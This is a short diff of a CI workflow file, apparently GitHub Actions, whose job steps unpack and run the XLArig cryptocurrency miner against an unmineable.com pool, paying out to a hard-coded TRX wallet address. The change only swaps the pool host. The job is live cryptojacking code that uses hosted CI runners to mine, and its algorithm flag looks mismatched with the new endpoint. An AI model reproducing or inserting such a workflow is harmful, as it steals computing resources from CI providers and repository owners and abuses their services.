@@ -21,6 +21,6 @@ jobs:
     - name: Seting-UP
       run: Expand-Archive XLArig-v5.2.2-win64.zip
     - name: Running
-      run: .\XLArig-v5.2.2-win64\xlarig.exe --no-huge-pages -o rx.unmineable.com:3333 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u TRX:TJx6Ct3b114rezJ6xq3XriG9in6DGBYpJ4.WORKER
+      run: .\XLArig-v5.2.2-win64\xlarig.exe --no-huge-pages -o etchash.unmineable.com:3333 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u TRX:TJx6Ct3b114rezJ6xq3XriG9in6DGBYpJ4.WORKER
     - name: DONE
       run: exit
